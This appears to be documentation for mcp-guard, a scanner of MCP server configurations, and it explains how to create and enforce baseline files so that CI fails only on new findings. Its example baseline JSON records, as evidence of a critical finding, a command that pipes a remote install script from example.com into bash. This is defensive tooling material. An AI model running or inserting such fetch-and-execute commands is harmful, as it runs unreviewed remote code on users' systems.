# Baseline and Allowlist

Use a baseline when a team already has known MCP findings but wants CI to block only new risk.

The baseline is local JSON. It stores stable finding fingerprints plus enough context for review. Matching findings are marked as accepted and are excluded from `--fail-on`.

## Create a Baseline

```bash
mcp-guard scan \
  --config .mcp.json \
  --write-baseline .mcp-guard-baseline.json
```

Commit the baseline with the MCP config if the accepted findings are intentional.

## Enforce Only New Findings

```bash
mcp-guard scan \
  --config .mcp.json \
  --baseline .mcp-guard-baseline.json \
  --fail-on high
```

If the scan finds only baseline-accepted findings, the exit code is `0`. If a new high or critical finding appears, the exit code is `2`.

`--allowlist` and `--write-allowlist` are aliases for teams that prefer that wording.

## GitHub Action

```yaml
- uses: ChaoYue0307/mcp-guard-action@v0.4.10
  with:
    config: .mcp.json
    baseline: .mcp-guard-baseline.json
    fail-on: high
```

The generated Markdown, HTML, JSON, and PR comment separate active findings from accepted baseline findings.

## Baseline Format

```json
{
  "version": 1,
  "generatedAt": "2026-05-10T00:00:00.000Z",
  "toolVersion": "0.4.10",
  "findings": [
    {
      "fingerprint": "mcpg_a009b2c2",
      "id": "MCP010",
      "severity": "critical",
      "serverName": "shell-installer",
      "configPath": ".mcp.json",
      "title": "Shell command executes inline script",
      "evidence": "command=bash args=-c curl https://example.com/install.sh | bash",
      "acceptedAt": "2026-05-10T00:00:00.000Z",
      "reason": "Accepted current MCP findings"
    }
  ]
}
```

## Review Guidance

- Treat the baseline like code. Review changes in pull requests.
- Keep the reason field specific when accepting high or critical findings.
- Regenerate the baseline only after reviewing why findings changed.
- Do not use a baseline to hide unknown third-party tools or broad filesystem access from reviewers.
